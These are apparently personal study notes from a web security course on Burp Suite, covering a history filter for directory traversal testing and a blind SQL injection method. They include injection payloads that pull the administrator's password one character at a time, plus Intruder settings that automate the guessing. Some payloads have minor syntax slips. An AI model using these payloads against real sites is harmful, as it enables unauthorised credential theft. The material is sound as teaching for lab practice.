# Burp tricks 
## Dir Traversal 
- In Burp, change the default filtering type to expose all files, binaries, images, so we can ***SEE*** and choose an appropriate HTTP request to send to repeater/intruder.
	- Burp -> HTTP history -> Filter Settings -> FIlter by MIME type -> check all

## Blind SQL
- TCM https://www.youtube.com/watch?v=j-fLh_WNg7k&list=PLLKT__MCUeixCoi2jtP2Jj8nZzM4MOzBL&index=16
---
1. For successful HTTP request, find message for successful request, like "Welcome Back"
2. At bottom of response pane, insert 'welcome' into the finder/matching text box
3. Now, whenever we test, we'll get 1 match when our SQLi works
4. When the request is a FAILURE, there will be no matches found.
5. Much faster than scrolling through 400 lines of response window.
```bash
# enumerate character by character
`and (select 'a' from users where username='administrator')='a;

# enumerate PWD character by character
# select first character, and compare to a
' and (select substring(password 1,1) from  users where username='administrator')='a;

# select first character, and compare to b
' and (select substring(password 1,1) from  users where username='administrator')='b;

# -> send to intruder,  mark characters to be FUZZed
' and (select substring(password MARK,1) from  users where username='administrator')='MARK;
```

 - Attack type -> Cluster bomb
-  Payload set 1:  0-9, indicating a 9 character password or less
- Payload set 2:  a-z & 0-9
- Start attack!  
- Look for length, sort by length.
- Filter by search term, re-use previous term, "Welcome"
- Order by payload1, which is order of password, or position of characters in password  